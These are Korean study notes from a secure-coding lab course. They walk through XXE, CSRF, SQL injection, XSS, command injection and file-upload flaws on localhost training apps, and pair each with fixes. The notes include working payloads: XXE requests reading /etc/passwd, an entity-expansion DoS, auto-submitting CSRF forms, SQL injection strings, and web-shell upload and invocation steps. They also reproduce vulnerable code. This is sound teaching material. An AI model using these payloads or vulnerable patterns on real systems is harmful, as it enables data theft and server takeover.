<comment><text>&rootdir;</text></comment>

결과 → 루트 디렉터리의 디렉터리 목록을 댓글내용에 출력

--------------------------------------------------
공격 문자열
POST /WebGoat/xxe/simple HTTP/1.1
Host: localhost:8282
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/xml
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: http://localhost:8282
Connection: close
Referer: http://localhost:8282/WebGoat/start.mvc
Cookie: JSESSIONID=tDAHsbQeVX4QU8w3a0lb56rbOpMjLuSXy9kJIqsg

<?xml version="1.0"?>
<!DOCTYPE hack [<!ENTITY passwd SYSTEM "/etc/passwd">]>
<comment><text>&passwd;</text></comment>

결과 → /etc/passwd 파일의 내용이 출력 ⇒ 계정 정보 탈취

-----------------------------------------------
공격 2. DOS 
공격 문자열
POST /WebGoat/xxe/simple HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/xml
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/WebGoat/start.mvc
Cookie: JSESSIONID=op5xzYVwWQE1UFsBF6Ok5fbLfiF0SGL_z_jLNjfR

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY a0 "dos " >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">  //& 는 참조개념
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<comment><text>&a4;</text></comment>

결과 → dos 문자열이 10,000번 출력되는 것을 확인
---------------------------------

코드 리뷰
/webgoat/src/main/java/org/owasp/webgoat/lessons/xxe/SimpleXXE.java
  @PostMapping(path = "xxe/simple", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
  @ResponseBody
  public AttackResult createNewComment(HttpServletRequest request, @RequestBody String commentStr) {
    String error = "";
    try {
      var comment = comments.parseXml(commentStr);		⇐ XML 문서를 파싱해서 Comments 객체를 반환(취약점 발생)
      comments.addComment(comment, false);
      if (checkSolution(comment)) {
        return success(this).build();
      }
    } catch (Exception e) {
      error = ExceptionUtils.getStackTrace(e);
    }
    return failed(this).output(error).build();
  }


/webgoat/src/main/java/org/owasp/webgoat/lessons/xxe/CommentsCache.java
  protected Comment parseXml(String xml) throws XMLStreamException, JAXBException {
    var jc = JAXBContext.newInstance(Comment.class);
    var xif = XMLInputFactory.newInstance();

    if (webSession.isSecurityEnabled()) {  //파서에 맞게 설정
      xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); 	// Compliant
      xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); 	// compliant
    }

    var xsr = xif.createXMLStreamReader(new StringReader(xml));

    var unmarshaller = jc.createUnmarshaller();
    return (Comment) unmarshaller.unmarshal(xsr);
  }


javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD
외부 DTD, 외부 엔티티 참조를 속성에서 지정한 프로토콜로 제한
빈 문자열 - 외부 참조에 대한 모든 액세스를 거부
file, http, jar:file - 프로토콜에만 권한을 부여하는 특정 프로토콜
all - 모든 프로토콜에 권한을 부여


javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA
schemaLocation 속성, Import 및 Include 요소에 의해 설정된 외부 참조용으로 지정된 프로토콜에 대한 액세스를 제한
빈 문자열 - 외부 참조에 대한 모든 액세스를 거부
file, http, jar:file - 프로토콜에만 권한을 부여하는 특정 프로토콜
all - 모든 프로토콜에 권한을 부여


-----------------------------------------------------------------------------
CSRF = 크로스사이트 요청 위조
정상적인 절차 여부와 요청 주체를 확인하지 않고 요청을 처리했을 때 발생

예) 패스워드 변경 기능을 구현

패스워드 변경 요청 페이지                                 패스워드 변경 처리 페이지
changePwForm.jsp                                          changePwProc.jsp
CUR PW: _________
New PW: _________                     +--------------->   1) 인증 여부 확인 (요청한 사용자가 로그인했는지 확인)
New PW: _________                     |                   2) 처리에 필요한 데이터(새 패스워드)가 전달되었는지 확인   
        [ change ]        –----------+                   3) 처리에 필요한 서버측 데이터를 추출 (세션 → 사용자ID)
                                                             CUR PW를 이용해서 요청 주체를 확인
                                                          4) update password = newpassword where userid = loginuserid 
(회원제) 게시판에 해당 코드를 삽입
제목: 반드시 확인해야 할 내용의 제목
=======================================================================
<iframe src="changePwProc.jsp?newpw=1234" width="0" height="0"></iframe>  //해당 jsp로 요청이 오면 잘못된 요청이다. -> 1234로 패스워드가 변경됨

정상적인 절차에 따른 요청인지를 확인하는 방법
1. Referer 헤더를 이용 : 요청이 발생한 곳(페이지)를 명시
2. Token을 이용 : 선행되어야 하는 페이지에 임의 값을 추가하고, 요청이 들어왔을 때 해당 값을 검증, 비교  -> 이것도 취약점이 있다. 스크립트로 토큰을 받아서 자동화를 통해 쓸수있다. 
 -  텍스트 기반의 토큰  <input type="hidden" name="csrf_token" value="fsaldklafdjfldsajfla" /> 
 -  이미지 기반의 토큰 ⇒ CAPTCHA, Completely Automated Public Turing test to tell Computers and Humans Apart ⇒ reCAPTCHA(자동차를 고르시오) ⇒ 자동화된 요청을 방지 = 사용자의 상호작용을 통한 요청 처리
요청 주체를 확인하는 방법 
중요 기능에 대해서는 재인증, 재인가를 수행 (기존 패스워드 입력을 통해)
~~~~~~~~~
	데이터를 생성, 수정, 삭제하는 기능
	중요 데이터를 처리하는 기능 
	돈이 관련된 기능 


--------------------------------------------
#) CSRF 실습

게시판 글쓰기 페이지 소스코드를 분석해서 글저장에 필요한 정보가 서버로 자동 전달될 수 있도록 코드를 작성
//아래내용을 게시판 내용에 삽입 (제목은 "모두 꼭 보세요")
<form action="write.do" method="post" enctype="multipart/form-data">
<input type="text" name="subject" value="제목.... 꼭 보세요." /> 
<input type="hidden" name="writer" value="아무개" /> 
<input type="hidden" name="writerId" value="admin" />
<textarea name="content">꼭 보셨나요?</textarea>
<input type="file" id="file" name="file" />
<input type="submit" value="확인" id="btnSubmit" />
</form>
<script> document.getElementById("btnSubmit").click(); </script>


위에서 등록한 글의 내용을 클릭하면("모두 꼭 보세요") → 스크립트를 통해서 발생한 요청으로 자동 글등록되는 것을 확인

//토큰을 이용해서 방어
글쓰기 페이지 요청이 들어왔을 때 서버에서 임의 코드를 생성해서 글쓰기 화면으로 전달하고, 해당 코드를 세션에 보관
BoardController.java

	// 글쓰기 요청이 들어왔을 때 글쓰기 페이지를 반환하는 컨트롤러
	@RequestMapping("/write.do")
	public String boardWrite(@ModelAttribute("BoardModel") BoardModel boardModel, HttpSession session) {
		// 임의 코드(난수)를 생성해서 세션에 저장
		String token = UUID.randomUUID().toString();
		session.setAttribute("csrf_token", token);
		return "/board/write";
	}


write.jsp
	<div id="content-container">
		<div id="content">
			<h3>새 글 쓰기</h3>
			<form action="write.do" method="post" onsubmit="return writeFormCheck()" enctype="multipart/form-data">
				<!-- 서버에서 생성해서 세션에 저장한 csrf_token을 히든 필더의 값으로 설정 -->
				<input type="hidden" name="param_token" value="${csrf_token}" />


	//글저장 요청이 들어왔을 때 화면에서 전달된 코드와 세션에 보관된 코드가 일치하는 경우에만 저장을 허용
	// 글저장 요청이 들어왔을 때 호출되는 컨트롤러 메서드
	@RequestMapping(value = "/write.do", method = RequestMethod.POST)
	public String boardWriteProc(@ModelAttribute("BoardModel") BoardModel boardModel, MultipartHttpServletRequest request, HttpSession session) {
		// 요청 파라미터로 전달된 토큰을 추출
		String paramToken = request.getParameter("param_token");
				
		// 세션에 저장된 토큰틀 추출
		String sessionToken = (String) session.getAttribute("csrf_token");
		
		// 토큰이 일치하지 않는 경우 목록 페이지로 리다이렉터
		if (sessionToken == null || paramToken == null || !sessionToken.equals(paramToken))
			return "redirect:list.do";


#) 기존에 게시판내용 <textarea>태그를 닫아놓고 아래내용을 넣고 게시판 작성하고 내용클릭시 자동으로 게시판이 만들어진다.
</textarea><iframe name="x" style="display:none"></iframe>
<form action="http://localhost:8080/kshield/regist/register" method="post" target="x">
<input id="n" name="name" style="display:none">
<input id="e" name="email" style="display:none">
<input id="t" name="phone" style="display:none">
<input id="p" name="password" style="display:none">
<textarea id="c" name="content" style="display:none"></textarea>
<button type="submit" id="b" style="display:none">저장</button>
</form><script>
  window.setTimeout(doSubmit, 1000);
  function doSubmit() {
    var id = Math.floor((Math.random() * 100) + 1);
    document.getElementById("n").value=id;
    document.getElementById("e").value=id+'@hack.com';
    document.getElementById("t").value='010-0000-0000';
    document.getElementById("p").value=id;
    document.getElementById("c").value='hack';
    document.getElementById("b").click();
  }</script>
==========================================================================
#)SQL Injection 
신청확인 페이지 분석
개발자 도구 또는 프록시를 이용해서 서버로 전달되는 파라미터를 분석하고, 해당 파라미터가 어떻게 사용될지를 유추하여 예상 실행 쿼리를 작성
SELECT * FROM user_info_table WHERE user_email = 'USER_EMAIL' and user_password = 'USER_PASSWORD'


패스워드 입력시 신청확인 페이지에서 쿼리 조작문자를 포함한 값을 전달 ⇒ 다른 사용자 정보가 조회되는 것을 확인
a' or 'a' = 'a' limit 0, 1 #		⇐ 등록된 첫번째 사용자  //한줄씩 가져온다.
a' or 'a' = 'a' limit 1, 2 #		⇐ 등록된 두번째 사용자  //한줄씩 가져온다.

SELECT * FROM user_info_table WHERE user_email = 'a' or 'a' = 'a' limit 0, 1 #' and user_password = 'USER_PASSWORD' // #부터는 주석, 그래서 모든 데이터 가져올수있다.

취약한 소스코드 확인
/src/main/reources/kr/co/openeg/mapper/RegistMapper.xml
	<!-- LAB SQL Injection : Insecure Code -->
	<select id="checkUser" resultType="kr.co.openeg.domain.RegistVO">
	<![CDATA[
		select *
		 from tbl_regist
		 where email = '${email}' and password = '${password}' and userrole = '${userRole}' 
	]]>
	</select>


/src/main/java/kr/co/openeg/controller/RegistController.java
	/* LAB SQL Injection : Insecure Code */
	@PostMapping("/checkUser")
	public String doCheckUser(HttpSession session, RegistVO rgvo, RedirectAttributes rttr) {
		RegistVO checkUserVo = service.checkUser(rgvo);	// ⇐ 외부 입력값이 쿼리 실행에 사용
		if (checkUserVo == null) {
			HashMap<String, String> hm = new HashMap<String, String>();
			hm.put("msg", CommonMessage.MSG_CHECKUSER_FAIL);
			rttr.addFlashAttribute("result", hm);
			return "redirect:/regist/checkUser";
		}
		
		setSessionInfo(session, checkUserVo);
		return "redirect:/regist/get";
	}


안전한 형태로 수정
/src/main/reources/kr/co/openeg/mapper/RegistMapper.xml
	<!-- LAB SQL Injection : Insecure Code -->
	<select id="checkUser" resultType="kr.co.openeg.domain.RegistVO">
	<![CDATA[
		select *
		 from tbl_regist
		 where email = #{email} and password = #{password} and userrole = #{userRole}  
	]]>
	</select>

-------------------------------------------------------
취약한 소스코드 확인
JSP의 표현언어(EL, Expression Language) 
${} : 해석되는 즉시 해당 표현식의 값이 반영 - 즉시 적용(immediate expression)
#{} : 해당 값이 쓰일 때 해당 값이 적용 - 지연 적용(deferred expression)

<%-- /k-shield/src/main/webapp/WEB-INF/views/board/get.jsp --%>
<div class="panel-body">
    <div class="form-group">
        <label>번호</label> 
        <input class="form-control" name="bno" value="${board.bno}" readonly="readonly">
    </div>
    <div class="form-group">
        <label>제목</label> 
        <input class="form-control" name="title" value="${board.title}" readonly="readonly">
    </div>
    <div class="form-group">
        <label>내용</label>
        <textarea class="form-control" rows="3" name="content" readonly="readonly">${board.content}</textarea>
    </div>
    <div class="form-group">
        <label>작성자</label> 
        <input class="form-control" name="writer" value="${board.writer}" readonly="readonly">
    </div>
    <div class="form-group">
        <label>등록일</label> 
        <input class="form-control" name="regDate" value="${board.regDate}" readonly="readonly">
    </div>
    <div class="form-group">
        <label>수정일</label> 
        <input class="form-control" name="updateDate" value="${board.updateDate}" readonly="readonly">
    </div>
    <form action="/board/list" method="get">
        <input type="hidden" name="pageNum" value="<c:out value="${cri.pageNum}"/>"> 
        <input type="hidden" name="amount"  value="<c:out value="${cri.amount }"/>"> 
        <input type="hidden" name="type"    value="<c:out value="${cri.type   }"/>">
        <input type="hidden" name="keyword" value="<c:out value="${cri.keyword}"/>">
        <button type="submit" class="btn btn-info">목록으로</button>
    </form>
</div>


안전한 형태로 수정
<c:out>
JSTL 중 하나로 escapeXml 속성 값이 기본적으로 true로 설정되어 태그 요소들을 HTML 인코딩하여 단순 문자열로 처리되기 때문에 ${board.content}에 alert가 있어도 그대로 문자열로 출력된다.


<%-- /k-shield/src/main/webapp/WEB-INF/views/board/get.jsp --%>
<div class="panel-body">
	<div class="form-group">
		<label>번호</label> 
		<input class="form-control" name="bno" value="<c:out value="${board.bno}"/>" readonly="readonly">
	</div>
	<div class="form-group">
		<label>제목</label> 
		<input class="form-control" name="title" value="<c:out value="${board.title}"/>" readonly="readonly">
	</div>
	<div class="form-group">
		<label>내용</label>
		<textarea class="form-control" rows="3" name="content" readonly="readonly"><c:out value="${board.content}"/></textarea>
	</div>
	<div class="form-group">
		<label>작성자</label> 
		<input class="form-control" name="writer" value="<c:out value="${board.writer}"/>" readonly="readonly">
	</div>
	<div class="form-group">
		<label>등록일</label> 
		<input class="form-control" name="regDate" value="<c:out value="${board.regDate}"/>" readonly="readonly">
	</div>
	<div class="form-group">
		<label>수정일</label> 
		<input class="form-control" name="updateDate" value="<c:out value="${board.updateDate}"/>" readonly="readonly">
	</div>
	<form action="/board/list" method="get">
		<input type="hidden" name="pageNum" value="<c:out value="${cri.pageNum}"/>"> 
		<input type="hidden" name="amount"  value="<c:out value="${cri.amount }"/>"> 
		<input type="hidden" name="type"    value="<c:out value="${cri.type   }"/>">
		<input type="hidden" name="keyword" value="<c:out value="${cri.keyword}"/>">
		<button type="submit" class="btn btn-info">목록으로</button>
	</form>
</div>

---------------------------------------------------
취약한 소스코드 확인
/* Java Resources/src/main/java/kr/co/openeg/controller/CommonController.java */
	/* LAB Command Injection : Insecure Code */
	@GetMapping(value = "/getDateTimeAction")
	@ResponseBody
	public ResponseEntity<String> getDateTimeAction(String cmd) {
		StringBuffer now = new StringBuffer();
		String[] cmds = new String[] { "cmd.exe", "/c", cmd }; 	//cmd를 파라미터로 받아서 명령어 실행
		Process process = null;
		InputStream is = null;
		Scanner scanner = null;
		try {
			process = Runtime.getRuntime().exec(cmds);
			is = process.getInputStream();
			scanner = new Scanner(is);		
			while (scanner.hasNext()) {
				now.append(scanner.next());
			}
		} catch (IOException ioe) {
			log.error(ioe.getMessage());
		} finally {
			if (scanner != null) {
				try { scanner.close(); } catch (Exception e) { log.error(e.getMessage()); }
			}
			if (is != null) {
				try { is.close(); } catch (IOException e) { log.error(e.getMessage()); }
			}
		}
		
		HttpHeaders resHeaders = new HttpHeaders();
              resHeaders.add("Content-Type", "text/plain;charset=UTF-8");
        
		return new ResponseEntity<String>(now.toString(), resHeaders, HttpStatus.OK);
	}


안전한 형태로 수정
<!-- /src/main/webapp/WEB-INF/views/includes/header.jsp -->
<script type="text/javascript">
	$(document).ready(function(e) {
		setInterval(function() {
			$.ajax({
		            url: '/getDateTimeAction',  //아래 컨트롤러로 전송
		            processData: false, 
	      	      		contentType: false,
		            type: 'GET',
		            success: function(result) {
		                $('.now').html('<i class="fas fa-clock"></i> '+result);
		            }
		        });
		}, 3000);
	});	
</script>


/* Java Resources/src/main/java/kr/co/openeg/controller/CommonController.java */
import java.text.SimpleDateFormat;
import java.util.Date;
	
@GetMapping(value = "/getDateTimeAction")
@ResponseBody
public ResponseEntity<String> getDateTimeAction() {
	SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd");	// ⇐ 불필요한 쉘 명령어 실행을 제거
	String now = sdf.format(new Date());
	return new ResponseEntity<String>(now, HttpStatus.OK);   //그냥 현재기준으로
}


공격 차단 확인
매개변수를 이용하지 않으므로 항상 현재 날짜만 반환(출력)



==========================================================================
#)파일업로드 취약점
- 파일의 종류를 검증할때는 Magin Number를 이용하는게 올바르다. gif면 특정 코드가 있다.
File Upload 취약점
파일 업로드 기능이 존재하는 경우, 
파일의 종류, 크기, 개수를 제한하지 않고 외부에서 접근 가능한 경로에 저장하는 경우 발생
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 						URL 주소로 접근이 가능한 경우, 
취약점을 가지고 있는 코드를 업로드한 후 
						해당 코드를 실행하는 방법으로 사용될 수 있음
종류를 제한하지 않으면 ⇒ 서버에서 실행 가능한 파일인 경우, 서버의 제어권 탈취에 악용될 수 있고, 클라이언트에서 실행 가능한 파일인 경우, 해당 서버가 악성 코드 유포지로 활용될 수 있음
크기와 개수를 제한하지 않으면 ⇒ 서버의 연결 자원 및 디스크 자원을 고갈시켜 정상적인 서비스를 방해


종류를 제한하는 방법
Content-Type / Mime 확인
확장자 비교    hacker.jpg.jsp
Magic Number = File Signature ⇒ https://www.garykessler.net/library/file_sigs.html

파일 업로드 기능이 존재 
<form enctype="multipart/form-data" method="post" ... >
	<input type="file" ... >
</form>

	@RequestMapping(value = "/write.do", method = RequestMethod.POST)
	public String boardWriteProc(@ModelAttribute("BoardModel") BoardModel boardModel, 
MultipartHttpServletRequest request, HttpSession session) {
~~~~~~~~~~~~~~~~~~~~~~~~~~~
multipart/form-data로 인코딩된 요청 데이터를 해석하는 객체
	
		// 요청 파라미터로 전달된 토큰을 추출
		String paramToken = request.getParameter("param_token");
				
		// 세션에 저장된 토큰틀 추출
		String sessionToken = (String) session.getAttribute("csrf_token");
		
		// 토큰이 일치하지 않는 경우 목록 페이지로 리다이렉터
		if (sessionToken == null || paramToken == null || !sessionToken.equals(paramToken))
			return "redirect:list.do";
		
		
		String uploadPath = session.getServletContext().getRealPath("/") + "files/";
		File dir = new File(uploadPath);
		if (!dir.exists()) {
			dir.mkdir();
		}

		업로드 파일에 대한 정보와 데이터를 가지고 있는 객체
		~~~~~~~~~~~~~
		MultipartFile file = request.getFile("file");	⇐ 요청 파라미터 이름이 file인 객체의 데이터를 추출
		if (file != null && !"".equals(file.getOriginalFilename())) {              ~~~~~~~~~~~~~~~~~~~~            
			String fileName = file.getOriginalFilename();                       파일 데이터
			File uploadFile = new File(uploadPath + fileName);
			if (uploadFile.exists()) {
				fileName = new Date().getTime() + fileName;
				uploadFile = new File(uploadPath + fileName);
			}

			try {
				file.transferTo(uploadFile);
			} catch (Exception e) {
				System.out.println("upload error");
			}
						
			boardModel.setFileName(fileName);
		}

		String content = boardModel.getContent().replaceAll("\r\n", "<br />");
		boardModel.setContent(content);
		service.writeArticle(boardModel);

		return "redirect:list.do";
	}

#1 이미지 파일을 첨부해서 게시글을 등록한 후 해당 게시글을 확인 → 첨부한 이미지가 출력되는 것을 확인
#2 페이지 소스 보기를 통해서 이미지를 어떻게 가져오는지 확인 ⇒ 외부 접근 가능한 경로에 저장(web root디렉토리 아래에 있는것들은 외부에서 접근가능하다)
#3 해당 서버에서 실행 가능한 파일(c:\FullstackLAB\tools\etc\OSCommand.jsp)을 업로드(서버에 저장) -> 이미지가 아니므로 화면에는 안나온다.(오류 아이콘)
#4 업로드한 파일을 주소를 통해 직접 호출
http://localhost:8080/openeg/files/OSCommand.jsp?cmd=ipconfig
#6 운영체제 명령어를 입력해서 전송 -> ipconfig를 입력해서 제출하면 결과나온다. 
#7 다른 방법으로 업로드 취약점이 존재하는 서버에 웹쉘과 같은 파일을 업로드해서 실행해 해당 서버의 제어권을 탈취
https://github.com/tennc/webshell	⇐ WebShell Open Source Project
-----------------------------------------------------------
#) log4j는 JNDI 인젝션을 이용 -> 버전업데이트로 막아야함

===========================================================
대칭키(키하나로) = 비밀키(공개되면안되니까) = 유일키  -> 똑같은 키를 가지고 있어야하는데 키를 어떻게 배분할것인가 그래야 복호화를 하니까, 또 키관리 문제가생긴다(통신 상대가 늘수록 키개수도증가)
비대칭키 = 개인키로 암호화하면 공개키로 복호화, 개인키로 복호화하면 공개키로 암호화 가능
-> 1.상대방의 공개키로 암호화하고 상대방은 자기 개인키로 복호화 -> 기밀성보장
-> 2.본인 A의 개인키로 암호화해서(서명) 공개한 키로 누구나 풀어볼수있다(서명을 검증). 이 데이터는 A가 만든 데이터라고 보증을해주는 것이다.(원본이라는 걸 보증해준다) -> 무결하다















































 


 

